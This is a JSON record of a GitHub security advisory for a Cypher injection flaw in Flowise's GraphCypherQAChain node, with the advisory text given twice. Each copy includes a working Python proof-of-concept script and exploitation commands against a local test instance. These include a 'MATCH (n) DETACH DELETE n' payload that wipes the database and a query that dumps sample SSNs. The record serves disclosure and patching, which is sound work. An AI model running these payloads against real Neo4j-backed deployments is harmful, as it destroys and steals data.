@@ -1,0 +1,114 @@
+{
+  "global": {
+    "cve_id": "CVE-2026-41274",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 0,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": 8.7,
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+      }
+    },
+    "cwe_ids": [
+      "CWE-943"
+    ],
+    "description": "## Summary\n\nThe GraphCypherQAChain node forwards user-provided input directly into the Cypher query execution pipeline without proper sanitization. An attacker can inject arbitrary Cypher commands that are executed on the underlying Neo4j database, enabling data exfiltration, modification, or deletion.\n\n## Vulnerability Details\n\n| Field | Value |\n|-------|-------|\n| Affected File | `packages/components/nodes/chains/GraphCypherQAChain/GraphCypherQAChain.ts` |\n| Affected Lines | 193-219 (run method) |\n\n## Prerequisites\n\nTo exploit this vulnerability, the following conditions must be met:\n\n1. **Neo4j Database**: A Neo4j instance must be connected to the Flowise server\n2. **Vulnerable Chatflow Configuration**:\n   - A chatflow containing the **Graph Cypher QA Chain** node\n   - Connected to a **Chat Model** (e.g., ChatOpenAI)\n   - Connected to a **Neo4j Graph** node with valid credentials\n3. **API Access**: Access to the chatflow's prediction endpoint (`/api/v1/prediction/{flowId}`)\n\n<img width=\"1627\" height=\"1202\" alt=\"vulnerability-diagram-prerequisites\" src=\"https://github.com/user-attachments/assets/8069e7df-799c-40cc-908a-ab7587b621d0\" />\n\n## Root Cause\n\nIn `GraphCypherQAChain.ts`, the `run` method passes user input directly to the chain without sanitization:\n\n```typescript\nasync run(nodeData: INodeData, input: string, options: ICommonObject): Promise<string | object> {\n    const chain = nodeData.instance as GraphCypherQAChain\n    // ...\n    \n    const obj = {\n        query: input  // User input passed directly\n    }\n    \n    // ...\n    response = await chain.invoke(obj, { callbacks })  // Executed without escaping\n}\n```\n\n## Impact\n\nAn attacker with access to a vulnerable chatflow can:\n\n1. **Data Exfiltration**: Read all data from the Neo4j database including sensitive fields\n2. **Data Modification**: Create, update, or delete nodes and relationships\n3. **Data Destruction**: Execute `DETACH DELETE` to wipe entire database\n4. **Schema Discovery**: Enumerate database structure, labels, and properties\n\n## Proof of Concept\n\n### poc.py\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nPOC: Cypher injection in GraphCypherQAChain (CWE-943)\n\nUsage:\n  python poc.py --target http://localhost:3000 --flow-id <FLOW_ID> --token <API_KEY>\n\"\"\"\n\nimport argparse\nimport json\nimport urllib.request\nimport urllib.error\n\ndef post_json(url, data, headers):\n    req = urllib.request.Request(\n        url,\n        data=json.dumps(data).encode(\"utf-8\"),\n        headers={**headers, \"Content-Type\": \"application/json\"},\n        method=\"POST\",\n    )\n    with urllib.request.urlopen(req, timeout=15) as resp:\n        return resp.status, resp.read().decode(\"utf-8\", errors=\"replace\")\n\ndef main():\n    ap = argparse.ArgumentParser()\n    ap.add_argument(\"--target\", required=True, help=\"Base URL, e.g. http://host:3000\")\n    ap.add_argument(\"--flow-id\", required=True, help=\"Chatflow ID with GraphCypherQAChain\")\n    ap.add_argument(\"--token\", help=\"Bearer token / API key if required\")\n    ap.add_argument(\n        \"--injection\",\n        default=\"MATCH (n) RETURN n\",\n        help=\"Cypher payload to inject\",\n    )\n    args = ap.parse_args()\n\n    payload = {\n        \"question\": args.injection,\n        \"overrideConfig\": {},\n    }\n\n    headers = {}\n    if args.token:\n        headers[\"Authorization\"] = f\"Bearer {args.token}\"\n\n    url = args.target.rstrip(\"/\") + f\"/api/v1/prediction/{args.flow_id}\"\n\n    try:\n        status, body = post_json(url, payload, headers)\n        print(body if body else f\"(empty response, HTTP {status})\")\n    except urllib.error.HTTPError as e:\n        print(e.read().decode(\"utf-8\", errors=\"replace\"))\n    except Exception as e:\n        print(f\"Error: {e}\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\n### Test Environment Setup\n\n**1. Start Neo4j with Docker:**\n```bash\ndocker run -d \\\n  --name neo4j-test \\\n  -p 7474:7474 \\\n  -p 7687:7687 \\\n  -e NEO4J_AUTH=neo4j/testpassword123 \\\n  neo4j:latest\n```\n\n**2. Create test data (in Neo4j Browser at http://localhost:7474):**\n```cypher\nCREATE (a:Person {name: 'Alice', secret: 'SSN-123-45-6789'})\nCREATE (b:Person {name: 'Bob', secret: 'SSN-987-65-4321'})\nCREATE (a)-[:KNOWS]->(b)\n```\n\n**3. Configure Flowise chatflow** (see screenshot)\n\n### Exploitation Steps\n\n```bash\n# Data destruction (DANGEROUS)\npython poc.py --target http://127.0.0.1:3000 \\\n  --flow-id <FLOW_ID> --token <API_KEY> \\\n  --injection \"MATCH (n) DETACH DELETE n\"\n```\n\n### Evidence\n\n**Cypher injection reaching Neo4j directly:**\n```\n$ python poc.py --target http://127.0.0.1:3000 --flow-id bbb330a5-... --token ...\n{\"text\":\"Error: All sub queries in an UNION must have the same return column names (line 2, column 16 (offset: 22))\\n\\\"RETURN 1 as ok UNION CALL db.labels() YIELD label RETURN label LIMIT 5\\\"\\n                ^\",...}\n```\nThe error message comes from Neo4j, proving the injected Cypher is executed directly.\n\n**Data destruction confirmed:**\n```\n$ python poc.py ... --injection \"MATCH (n) DETACH DELETE n\"\n{\"json\":[],...}\n```\nEmpty result indicates all nodes were deleted.\n\n**Sensitive data exfiltration:**\n```\n$ python poc.py ... --injection \"MATCH (n) RETURN n\"\n{\"json\":[{\"n\":{\"name\":\"Alice\",\"secret\":\"SSN-123-45-6789\"}},{\"n\":{\"name\":\"Bob\",\"secret\":\"SSN-987-65-4321\"}}],...}\n```",
+    "ghsa_id": "GHSA-28g4-38q8-3cwc",
+    "html_url": "https://github.com/advisories/GHSA-28g4-38q8-3cwc",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-28g4-38q8-3cwc"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-41274"
+      }
+    ],
+    "published_at": "2026-04-16T21:54:26Z",
+    "references": [
+      "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-28g4-38q8-3cwc",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-41274",
+      "https://github.com/advisories/GHSA-28g4-38q8-3cwc"
+    ],
+    "severity": "high",
+    "summary": "Flowise: Cypher Injection in GraphCypherQAChain",
+    "updated_at": "2026-04-24T19:40:34Z",
+    "vulnerabilities": [
+      {
+        "first_patched_version": "3.1.0",
+        "package": {
+          "ecosystem": "npm",
+          "name": "flowise"
+        },
+        "vulnerable_version_range": "<= 3.0.13"
+      },
+      {
+        "first_patched_version": "3.1.0",
+        "package": {
+          "ecosystem": "npm",
+          "name": "flowise-components"
+        },
+        "vulnerable_version_range": "<= 3.0.13"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "id": "GHSA-28g4-38q8-3cwc",
+  "repo": {
+    "cve_id": "CVE-2026-41274",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": 8.7,
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/SC:N/VI:H/SI:N/VA:H/SA:N"
+      }
+    },
+    "cwe_ids": [
+      "CWE-943"
+    ],
+    "description": "## Summary\r\n\r\nThe GraphCypherQAChain node forwards user-provided input directly into the Cypher query execution pipeline without proper sanitization. An attacker can inject arbitrary Cypher commands that are executed on the underlying Neo4j database, enabling data exfiltration, modification, or deletion.\r\n\r\n## Vulnerability Details\r\n\r\n| Field | Value |\r\n|-------|-------|\r\n| CWE | CWE-943: Improper Neutralization of Special Elements in Data Query Logic |\r\n| Affected File | `packages/components/nodes/chains/GraphCypherQAChain/GraphCypherQAChain.ts` |\r\n| Affected Lines | 193-219 (run method) |\r\n| CVSS 3.1 | 8.1 (High) |\r\n\r\n## Prerequisites\r\n\r\nTo exploit this vulnerability, the following conditions must be met:\r\n\r\n1. **Neo4j Database**: A Neo4j instance must be connected to the Flowise server\r\n2. **Vulnerable Chatflow Configuration**:\r\n   - A chatflow containing the **Graph Cypher QA Chain** node\r\n   - Connected to a **Chat Model** (e.g., ChatOpenAI)\r\n   - Connected to a **Neo4j Graph** node with valid credentials\r\n3. **API Access**: Access to the chatflow's prediction endpoint (`/api/v1/prediction/{flowId}`)\r\n\r\n<img width=\"1627\" height=\"1202\" alt=\"vulnerability-diagram-prerequisites\" src=\"https://github.com/user-attachments/assets/8069e7df-799c-40cc-908a-ab7587b621d0\" />\r\n\r\n## Root Cause\r\n\r\nIn `GraphCypherQAChain.ts`, the `run` method passes user input directly to the chain without sanitization:\r\n\r\n```typescript\r\nasync run(nodeData: INodeData, input: string, options: ICommonObject): Promise<string | object> {\r\n    const chain = nodeData.instance as GraphCypherQAChain\r\n    // ...\r\n    \r\n    const obj = {\r\n        query: input  // User input passed directly\r\n    }\r\n    \r\n    // ...\r\n    response = await chain.invoke(obj, { callbacks })  // Executed without escaping\r\n}\r\n```\r\n\r\n## Impact\r\n\r\nAn attacker with access to a vulnerable chatflow can:\r\n\r\n1. **Data Exfiltration**: Read all data from the Neo4j database including sensitive fields\r\n2. **Data Modification**: Create, update, or delete nodes and relationships\r\n3. **Data Destruction**: Execute `DETACH DELETE` to wipe entire database\r\n4. **Schema Discovery**: Enumerate database structure, labels, and properties\r\n\r\n## Proof of Concept\r\n\r\n### poc.py\r\n\r\n```python\r\n#!/usr/bin/env python3\r\n\"\"\"\r\nPOC: Cypher injection in GraphCypherQAChain (CWE-943)\r\n\r\nUsage:\r\n  python poc.py --target http://localhost:3000 --flow-id <FLOW_ID> --token <API_KEY>\r\n\"\"\"\r\n\r\nimport argparse\r\nimport json\r\nimport urllib.request\r\nimport urllib.error\r\n\r\ndef post_json(url, data, headers):\r\n    req = urllib.request.Request(\r\n        url,\r\n        data=json.dumps(data).encode(\"utf-8\"),\r\n        headers={**headers, \"Content-Type\": \"application/json\"},\r\n        method=\"POST\",\r\n    )\r\n    with urllib.request.urlopen(req, timeout=15) as resp:\r\n        return resp.status, resp.read().decode(\"utf-8\", errors=\"replace\")\r\n\r\ndef main():\r\n    ap = argparse.ArgumentParser()\r\n    ap.add_argument(\"--target\", required=True, help=\"Base URL, e.g. http://host:3000\")\r\n    ap.add_argument(\"--flow-id\", required=True, help=\"Chatflow ID with GraphCypherQAChain\")\r\n    ap.add_argument(\"--token\", help=\"Bearer token / API key if required\")\r\n    ap.add_argument(\r\n        \"--injection\",\r\n        default=\"MATCH (n) RETURN n\",\r\n        help=\"Cypher payload to inject\",\r\n    )\r\n    args = ap.parse_args()\r\n\r\n    payload = {\r\n        \"question\": args.injection,\r\n        \"overrideConfig\": {},\r\n    }\r\n\r\n    headers = {}\r\n    if args.token:\r\n        headers[\"Authorization\"] = f\"Bearer {args.token}\"\r\n\r\n    url = args.target.rstrip(\"/\") + f\"/api/v1/prediction/{args.flow_id}\"\r\n\r\n    try:\r\n        status, body = post_json(url, payload, headers)\r\n        print(body if body else f\"(empty response, HTTP {status})\")\r\n    except urllib.error.HTTPError as e:\r\n        print(e.read().decode(\"utf-8\", errors=\"replace\"))\r\n    except Exception as e:\r\n        print(f\"Error: {e}\")\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n```\r\n\r\n### Test Environment Setup\r\n\r\n**1. Start Neo4j with Docker:**\r\n```bash\r\ndocker run -d \\\r\n  --name neo4j-test \\\r\n  -p 7474:7474 \\\r\n  -p 7687:7687 \\\r\n  -e NEO4J_AUTH=neo4j/testpassword123 \\\r\n  neo4j:latest\r\n```\r\n\r\n**2. Create test data (in Neo4j Browser at http://localhost:7474):**\r\n```cypher\r\nCREATE (a:Person {name: 'Alice', secret: 'SSN-123-45-6789'})\r\nCREATE (b:Person {name: 'Bob', secret: 'SSN-987-65-4321'})\r\nCREATE (a)-[:KNOWS]->(b)\r\n```\r\n\r\n**3. Configure Flowise chatflow** (see screenshot)\r\n\r\n### Exploitation Steps\r\n\r\n```bash\r\n# Data destruction (DANGEROUS)\r\npython poc.py --target http://127.0.0.1:3000 \\\r\n  --flow-id <FLOW_ID> --token <API_KEY> \\\r\n  --injection \"MATCH (n) DETACH DELETE n\"\r\n```\r\n\r\n### Evidence\r\n\r\n**Cypher injection reaching Neo4j directly:**\r\n```\r\n$ python poc.py --target http://127.0.0.1:3000 --flow-id bbb330a5-... --token ...\r\n{\"text\":\"Error: All sub queries in an UNION must have the same return column names (line 2, column 16 (offset: 22))\\n\\\"RETURN 1 as ok UNION CALL db.labels() YIELD label RETURN label LIMIT 5\\\"\\n                ^\",...}\r\n```\r\nThe error message comes from Neo4j, proving the injected Cypher is executed directly.\r\n\r\n**Data destruction confirmed:**\r\n```\r\n$ python poc.py ... --injection \"MATCH (n) DETACH DELETE n\"\r\n{\"json\":[],...}\r\n```\r\nEmpty result indicates all nodes were deleted.\r\n\r\n**Sensitive data exfiltration:**\r\n```\r\n$ python poc.py ... --injection \"MATCH (n) RETURN n\"\r\n{\"json\":[{\"n\":{\"name\":\"Alice\",\"secret\":\"SSN-123-45-6789\"}},{\"n\":{\"name\":\"Bob\",\"secret\":\"SSN-987-65-4321\"}}],...}\r\n```\r\n\r\n## References\r\n\r\n- [CWE-943: Improper Neutralization of Special Elements in Data Query Logic](https://cwe.mitre.org/data/definitions/943.html)\r\n- [Neo4j Cypher Injection](https://neo4j.com/developer/kb/protecting-against-cypher-injection/)\r\n- [OWASP Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)",
+    "ghsa_id": "GHSA-28g4-38q8-3cwc",
+    "html_url": "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-28g4-38q8-3cwc",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-28g4-38q8-3cwc"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-41274"
+      }
+    ],
+    "published_at": "2026-04-15T21:43:45Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Cypher Injection in GraphCypherQAChain",
+    "updated_at": "2026-04-20T15:32:03Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "flowise"
+        },
+        "patched_versions": "3.1.0",
+        "vulnerable_version_range": "<= 3.0.13"
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "flowise-components"
+        },
+        "patched_versions": "3.1.0",
+        "vulnerable_version_range": "<= 3.0.13"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "FlowiseAI/Flowise"
+}
